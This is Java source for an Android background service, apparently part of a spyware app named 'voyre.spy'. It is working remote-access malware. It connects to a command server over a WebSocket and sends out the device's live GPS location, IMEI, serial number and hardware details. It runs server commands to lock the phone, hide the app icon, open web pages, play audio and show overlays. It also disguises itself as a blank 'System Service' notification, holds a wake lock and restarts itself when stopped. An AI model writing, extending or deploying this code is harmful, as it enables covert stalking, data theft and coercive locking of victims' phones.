package com.voyre.spy;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.StatFs;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

import com.bumptech.glide.Glide;
import com.bumptech.glide.request.target.SimpleTarget;
import com.bumptech.glide.request.transition.Transition;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class BackgroundService extends Service {
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "spy_channel";
    
    private WebSocket webSocket;
    private Handler backgroundHandler;
    private HandlerThread handlerThread;
    private String deviceId;
    private String username;
    private String model;
    private MediaPlayer mediaPlayer;
    private CameraManager cameraManager;
    private String cameraId;
    private PowerManager.WakeLock wakeLock;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private boolean isConnected = false;
    private LocationManager locationManager;
    private TelephonyManager telephonyManager;
    private PackageManager packageManager;
    private ConnectivityManager connectivityManager;
    private BatteryManager batteryManager;
    private int reconnectAttempts = 0;
    private Location lastLocation = null;
    private LocationListener locationListener;
    private WindowManager windowManager;
    private ArrayList<View> floatingImages = new ArrayList<>();
    private Random random = new Random();
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        handlerThread = new HandlerThread("BackgroundService");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        initializeManagers();
        initializeDeviceInfo();
        acquireWakeLock();
        
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                connectWebSocket();
            }
        });
        
        backgroundHandler.post(new Runnable() {
            @Override
            public void run() {
                startLocationUpdates();
            }
        });
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendBatteryInfo();
            }
        }, 10000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendDeviceInfo();
            }
        }, 2000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                heartbeatRunnable();
            }
        }, 5000);
    }
    
    private void initializeManagers() {
        try {
            cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        } catch (Exception e) {}
        
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);
        } catch (Exception e) {}
        
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        } catch (Exception e) {}
        
        try {
            telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        } catch (Exception e) {}
        
        try {
            connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        } catch (Exception e) {}
        
        try {
            batteryManager = (BatteryManager) getSystemService(BATTERY_SERVICE);
        } catch (Exception e) {}
        
        try {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        } catch (Exception e) {}
        
        packageManager = getPackageManager();
    }
    
    private void initializeDeviceInfo() {
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null) deviceId = "unknown_" + System.currentTimeMillis();
        } catch (Exception e) {
            deviceId = "unknown_" + System.currentTimeMillis();
        }
        
        username = Config.getUsername(this);
        if (username == null) username = "default";
        
        model = Build.MODEL;
        if (model == null) model = "unknown";
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService::WakeLock");
                wakeLock.acquire();
            }
        } catch (Exception e) {}
    }
    
    private void startLocationUpdates() {
        try {
            if (locationManager == null) return;
            
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    lastLocation = location;
                    sendLocation(location);
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                
                @Override
                public void onProviderEnabled(String provider) {}
                
                @Override
                public void onProviderDisabled(String provider) {}
            };
            
            try {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, locationListener);
            } catch (Exception e) {}
            
            try {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10, locationListener);
            } catch (Exception e) {}
            
            try {
                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (gpsLocation != null) {
                    lastLocation = gpsLocation;
                    sendLocation(gpsLocation);
                }
            } catch (Exception e) {}
            
            try {
                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (networkLocation != null && lastLocation == null) {
                    lastLocation = networkLocation;
                    sendLocation(networkLocation);
                }
            } catch (Exception e) {}
            
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void connectWebSocket() {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                .pingInterval(5, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
            
            Request request = new Request.Builder()
                .url(Config.WS_URL)
                .build();
            
            webSocket = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    isConnected = true;
                    reconnectAttempts = 0;
                    sendAuth();
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            sendDeviceInfo();
                        }
                    }, 1000);
                }
                
                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    handleWebSocketMessage(text);
                }
                
                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    isConnected = false;
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            reconnect();
                        }
                    }, 5000);
                }
                
                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    isConnected = false;
                    backgroundHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            reconnect();
                        }
                    }, 5000);
                }
            });
        } catch (Exception e) {
            backgroundHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    reconnect();
                }
            }, 5000);
        }
    }
    
    private void handleWebSocketMessage(String text) {
        try {
            JSONObject cmd = new JSONObject(text);
            
            if (!cmd.has("type")) return;
            
            String type = cmd.getString("type");
            
            if ("ping".equals(type)) {
                JSONObject pong = new JSONObject();
                try {
                    pong.put("type", "pong");
                    webSocket.send(pong.toString());
                } catch (Exception e) {}
            }
            
            if ("command".equals(type) && cmd.has("command")) {
                String command = cmd.getString("command");
                
                JSONObject response = new JSONObject();
                try {
                    response.put("type", "command_received");
                    response.put("command", command);
                } catch (Exception e) {}
                
                if ("lock".equals(command)) {
                    lockDevice();
                } else if ("unlock".equals(command)) {
                    unlockDevice();
                } else if ("flashlight_on".equals(command)) {
                    toggleFlashlight(true);
                } else if ("flashlight_off".equals(command)) {
                    toggleFlashlight(false);
                } else if ("play_music".equals(command) && cmd.has("url")) {
                    try {
                        playMusic(cmd.getString("url"));
                    } catch (Exception e) {}
                } else if ("stop_music".equals(command)) {
                    stopMusic();
                } else if ("hide_app".equals(command)) {
                    hideApp();
                } else if ("show_app".equals(command)) {
                    showApp();
                } else if ("open_web".equals(command) && cmd.has("url")) {
                    try {
                        openWebPage(cmd.getString("url"));
                    } catch (Exception e) {}
                } else if ("show_notification".equals(command) && cmd.has("title") && cmd.has("message")) {
                    try {
                        showCustomNotification(cmd.getString("title"), cmd.getString("message"));
                    } catch (Exception e) {}
                } else if ("show_popup".equals(command) && cmd.has("title") && cmd.has("message")) {
                    try {
                        showModernPopup(cmd.getString("title"), cmd.getString("message"));
                    } catch (Exception e) {}
                } else if ("show_floating_images".equals(command) && cmd.has("url") && cmd.has("count")) {
                    try {
                        showFloatingImages(cmd.getString("url"), cmd.getInt("count"));
                    } catch (Exception e) {}
                } else if ("clear_floating_images".equals(command)) {
                    clearFloatingImages();
                }
                
                try {
                    webSocket.send(response.toString());
                } catch (Exception e) {}
            }
        } catch (Exception e) {}
    }
    
    private void openWebPage(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void showCustomNotification(String title, String message) {
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    "custom_notifications",
                    "Custom Notifications",
                    NotificationManager.IMPORTANCE_HIGH
                );
                channel.setDescription("Custom notifications from server");
                notificationManager.createNotificationChannel(channel);
            }
            
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "custom_notifications")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL);
            
            int notificationId = (int) System.currentTimeMillis();
            notificationManager.notify(notificationId, builder.build());
            
        } catch (Exception e) {}
    }
    
    private void showModernPopup(String title, String message) {
        try {
            backgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                        
                        int layoutFlag;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                        } else {
                            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                        }
                        
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            layoutFlag,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                            PixelFormat.TRANSLUCENT
                        );
                        
                        params.gravity = Gravity.CENTER;
                        params.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.85);
                        
                        LayoutInflater inflater = LayoutInflater.from(BackgroundService.this);
                        LinearLayout layout = new LinearLayout(BackgroundService.this);
                        layout.setOrientation(LinearLayout.VERTICAL);
                        layout.setBackgroundColor(Color.parseColor("#DD2A2A2A"));
                        layout.setPadding(50, 50, 50, 50);
                        
                        TextView titleView = new TextView(BackgroundService.this);
                        titleView.setText(title);
                        titleView.setTextColor(Color.WHITE);
                        titleView.setTextSize(22);
                        titleView.setTypeface(Typeface.DEFAULT_BOLD);
                        titleView.setGravity(Gravity.CENTER);
                        titleView.setPadding(0, 0, 0, 30);
                        layout.addView(titleView);
                        
                        TextView messageView = new TextView(BackgroundService.this);
                        messageView.setText(message);
                        messageView.setTextColor(Color.parseColor("#EEEEEE"));
                        messageView.setTextSize(16);
                        messageView.setGravity(Gravity.CENTER);
                        messageView.setPadding(20, 20, 20, 40);
                        layout.addView(messageView);
                        
                        Button okButton = new Button(BackgroundService.this);
                        okButton.setText("OK");
                        okButton.setTextColor(Color.WHITE);
                        okButton.setBackgroundColor(Color.parseColor("#4CAF50"));
                        okButton.setPadding(30, 20, 30, 20);
                        
                        FrameLayout buttonContainer = new FrameLayout(BackgroundService.this);
                        buttonContainer.addView(okButton);
                        layout.addView(buttonContainer);
                        
                        windowManager.addView(layout, params);
                        
                        okButton.setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                try {
                                    windowManager.removeView(layout);
                                } catch (Exception e) {}
                            }
                        });
                        
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void showFloatingImages(String imageUrl, int count) {
        try {
            for (int i = 0; i < count; i++) {
                showSingleFloatingImage(imageUrl, i);
            }
        } catch (Exception e) {}
    }
    
    private void showSingleFloatingImage(String imageUrl, int index) {
        try {
            backgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        int layoutFlag;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                        } else {
                            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                        }
                        
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            WindowManager.LayoutParams.WRAP_CONTENT,
                            layoutFlag,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                            PixelFormat.TRANSLUCENT
                        );
                        
                        int screenWidth = getResources().getDisplayMetrics().widthPixels;
                        int screenHeight = getResources().getDisplayMetrics().heightPixels;
                        
                        params.x = random.nextInt(screenWidth - 300);
                        params.y = random.nextInt(screenHeight - 300);
                        
                        ImageView imageView = new ImageView(BackgroundService.this);
                        imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
                        
                        FrameLayout touchInterceptor = new FrameLayout(BackgroundService.this);
                        touchInterceptor.addView(imageView);
                        
                        touchInterceptor.setOnTouchListener(new View.OnTouchListener() {
                            private int initialX;
                            private int initialY;
                            private float initialTouchX;
                            private float initialTouchY;
                            
                            @Override
                            public boolean onTouch(View v, MotionEvent event) {
                                switch (event.getAction()) {
                                    case MotionEvent.ACTION_DOWN:
                                        initialX = params.x;
                                        initialY = params.y;
                                        initialTouchX = event.getRawX();
                                        initialTouchY = event.getRawY();
                                        return true;
                                        
                                    case MotionEvent.ACTION_MOVE:
                                        params.x = initialX + (int) (event.getRawX() - initialTouchX);
                                        params.y = initialY + (int) (event.getRawY() - initialTouchY);
                                        windowManager.updateViewLayout(touchInterceptor, params);
                                        return true;
                                        
                                    case MotionEvent.ACTION_UP:
                                        return false;
                                }
                                return false;
                            }
                        });
                        
                        windowManager.addView(touchInterceptor, params);
                        floatingImages.add(touchInterceptor);
                        
                        Glide.with(BackgroundService.this)
                            .asBitmap()
                            .load(imageUrl)
                            .into(new SimpleTarget<Bitmap>() {
                                @Override
                                public void onResourceReady(Bitmap resource, Transition<? super Bitmap> transition) {
                                    imageView.setImageBitmap(resource);
                                }
                            });
                        
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void clearFloatingImages() {
        try {
            for (View view : floatingImages) {
                try {
                    windowManager.removeView(view);
                } catch (Exception e) {}
            }
            floatingImages.clear();
        } catch (Exception e) {}
    }
    
    private void lockDevice() {
        try {
            if (devicePolicyManager != null && devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow();
            }
            showLockScreen();
        } catch (Exception e) {}
    }
    
    private void unlockDevice() {
        try {
            hideLockScreen();
        } catch (Exception e) {}
    }
    
    private void hideApp() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
    
    private void showApp() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
    
    private void reconnect() {
        reconnectAttempts++;
        long delay = Math.min(5000 * reconnectAttempts, 30000);
        
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (webSocket != null) {
                    try {
                        webSocket.cancel();
                    } catch (Exception e) {}
                }
                connectWebSocket();
            }
        }, delay);
    }
    
    private void sendAuth() {
        try {
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("username", username);
            auth.put("device_id", deviceId);
            auth.put("model", model);
            auth.put("battery", getBatteryLevel());
            if (webSocket != null && isConnected) {
                webSocket.send(auth.toString());
            }
        } catch (Exception e) {}
    }
    
    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            
            info.put("type", "device_info");
            info.put("device_id", deviceId);
            info.put("username", username);
            info.put("model", safeString(Build.MODEL));
            info.put("manufacturer", safeString(Build.MANUFACTURER));
            info.put("brand", safeString(Build.BRAND));
            info.put("product", safeString(Build.PRODUCT));
            info.put("device", safeString(Build.DEVICE));
            info.put("hardware", safeString(Build.HARDWARE));
            info.put("serial", safeString(Build.SERIAL));
            info.put("display", safeString(Build.DISPLAY));
            info.put("android_version", safeString(Build.VERSION.RELEASE));
            info.put("sdk_version", Build.VERSION.SDK_INT);
            info.put("build_id", safeString(Build.ID));
            info.put("build_type", safeString(Build.TYPE));
            info.put("tags", safeString(Build.TAGS));
            info.put("fingerprint", safeString(Build.FINGERPRINT));
            info.put("board", safeString(Build.BOARD));
            info.put("bootloader", safeString(Build.BOOTLOADER));
            
            try {
                String radio = Build.getRadioVersion();
                if (radio != null) info.put("radio", radio);
            } catch (Exception e) {}
            
            getTelephonyInfo(info);
            getAppInfo(info);
            getNetworkInfo(info);
            getMemoryInfo(info);
            getStorageInfo(info);
            getLocaleInfo(info);
            getScreenInfo(info);
            
            info.put("battery", getBatteryLevel());
            
            long currentTime = System.currentTimeMillis();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
            info.put("last_seen", sdf.format(new Date(currentTime)));
            
            if (webSocket != null && isConnected) {
                webSocket.send(info.toString());
            }
            
        } catch (Exception e) {}
    }
    
    private String safeString(String value) {
        return value != null ? value : "unknown";
    }
    
    private void getTelephonyInfo(JSONObject info) {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED && telephonyManager != null) {
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    String imei = telephonyManager.getImei();
                    if (imei != null) info.put("imei", imei);
                } else {
                    String deviceId = telephonyManager.getDeviceId();
                    if (deviceId != null) info.put("imei", deviceId);
                }
                
                String simOperator = telephonyManager.getSimOperatorName();
                if (simOperator != null) info.put("sim_operator", simOperator);
                
                String networkOperator = telephonyManager.getNetworkOperatorName();
                if (networkOperator != null) info.put("network_operator", networkOperator);
            }
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void getAppInfo(JSONObject info) {
        try {
            PackageInfo pInfo = packageManager.getPackageInfo(getPackageName(), 0);
            info.put("app_version", pInfo.versionName != null ? pInfo.versionName : "1.0");
            info.put("app_version_code", pInfo.versionCode);
        } catch (Exception e) {}
    }
    
    private void getNetworkInfo(JSONObject info) {
        try {
            if (connectivityManager != null) {
                NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
                if (activeNetwork != null) {
                    info.put("network_connected", activeNetwork.isConnectedOrConnecting());
                    info.put("network_type_name", activeNetwork.getTypeName() != null ? activeNetwork.getTypeName() : "unknown");
                } else {
                    info.put("network_connected", false);
                    info.put("network_type_name", "none");
                }
            }
        } catch (Exception e) {}
    }
    
    private void getMemoryInfo(JSONObject info) {
        try {
            Runtime runtime = Runtime.getRuntime();
            info.put("ram_total", runtime.totalMemory());
            info.put("ram_free", runtime.freeMemory());
            info.put("ram_max", runtime.maxMemory());
            info.put("available_processors", runtime.availableProcessors());
        } catch (Exception e) {}
    }
    
    private void getStorageInfo(JSONObject info) {
        try {
            File path = Environment.getDataDirectory();
            StatFs statFs = new StatFs(path.getPath());
            long totalStorage = (long) statFs.getBlockCount() * (long) statFs.getBlockSize();
            long freeStorage = (long) statFs.getAvailableBlocks() * (long) statFs.getBlockSize();
            info.put("storage_total", totalStorage);
            info.put("storage_free", freeStorage);
            info.put("storage_used", totalStorage - freeStorage);
        } catch (Exception e) {}
    }
    
    private void getLocaleInfo(JSONObject info) {
        try {
            info.put("timezone", java.util.TimeZone.getDefault().getID());
            info.put("language", Locale.getDefault().getLanguage());
            info.put("country", Locale.getDefault().getCountry());
        } catch (Exception e) {}
    }
    
    private void getScreenInfo(JSONObject info) {
        try {
            info.put("screen_density", getResources().getDisplayMetrics().densityDpi);
            info.put("screen_width", getResources().getDisplayMetrics().widthPixels);
            info.put("screen_height", getResources().getDisplayMetrics().heightPixels);
        } catch (Exception e) {}
    }
    
    private void sendLocation(Location location) {
        try {
            if (location == null) return;
            
            JSONObject locData = new JSONObject();
            locData.put("type", "location");
            locData.put("lat", location.getLatitude());
            locData.put("lng", location.getLongitude());
            locData.put("accuracy", (float) location.getAccuracy());
            locData.put("provider", location.getProvider() != null ? location.getProvider() : "unknown");
            locData.put("speed", (float) location.getSpeed());
            locData.put("bearing", (float) location.getBearing());
            locData.put("altitude", location.getAltitude());
            locData.put("time", location.getTime());
            
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            locData.put("time_formatted", sdf.format(new Date(location.getTime())));
            
            if (webSocket != null && isConnected) {
                webSocket.send(locData.toString());
            }
        } catch (Exception e) {}
    }
    
    private void sendBatteryInfo() {
        try {
            int level = getBatteryLevel();
            int temperature = 0;
            boolean charging = false;
            
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            
            if (batteryStatus != null) {
                temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                charging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
            }
            
            JSONObject batteryData = new JSONObject();
            batteryData.put("type", "battery");
            batteryData.put("level", level);
            batteryData.put("temperature", temperature);
            batteryData.put("charging", charging);
            batteryData.put("time", System.currentTimeMillis());
            
            if (webSocket != null && isConnected) {
                webSocket.send(batteryData.toString());
            }
            
            backgroundHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBatteryInfo();
                }
            }, 60000);
            
        } catch (Exception e) {}
    }
    
    private int getBatteryLevel() {
        try {
            if (batteryManager != null) {
                return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
        } catch (Exception e) {}
        return 0;
    }
    
    private void heartbeatRunnable() {
        if (webSocket != null && isConnected) {
            try {
                JSONObject ping = new JSONObject();
                ping.put("type", "ping");
                webSocket.send(ping.toString());
            } catch (Exception e) {}
        }
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                heartbeatRunnable();
            }
        }, 5000);
    }
    
    private void toggleFlashlight(boolean on) {
        try {
            if (cameraManager == null) return;
            
            if (cameraId == null) {
                String[] cameraIdList = cameraManager.getCameraIdList();
                if (cameraIdList != null && cameraIdList.length > 0) {
                    cameraId = cameraIdList[0];
                } else {
                    return;
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, on);
            }
        } catch (Exception e) {}
    }
    
    private void playMusic(String url) {
        try {
            if (mediaPlayer != null) {
                try {
                    mediaPlayer.release();
                } catch (Exception e) {}
                mediaPlayer = null;
            }
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.setDataSource(url);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
                @Override
                public void onPrepared(MediaPlayer mp) {
                    try {
                        mp.start();
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void stopMusic() {
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                mediaPlayer.release();
            } catch (Exception e) {}
            mediaPlayer = null;
        }
    }
    
    private void showLockScreen() {
        try {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void hideLockScreen() {
        try {
            Intent intent = new Intent("UNLOCK_ACTION");
            sendBroadcast(intent);
        } catch (Exception e) {}
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("System background service");
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {}
        }
    }
    
    private Notification createNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true);
        
        return builder.build();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            
            if (webSocket != null) {
                webSocket.close(1000, "Service destroyed");
            }
            
            if (locationManager != null && locationListener != null) {
                locationManager.removeUpdates(locationListener);
            }
            
            if (mediaPlayer != null) {
                mediaPlayer.release();
            }
            
            clearFloatingImages();
            
            if (backgroundHandler != null) {
                backgroundHandler.removeCallbacksAndMessages(null);
            }
            
            if (handlerThread != null) {
                handlerThread.quitSafely();
            }
            
            Intent intent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            
        } catch (Exception e) {}
        
        super.onDestroy();
    }
}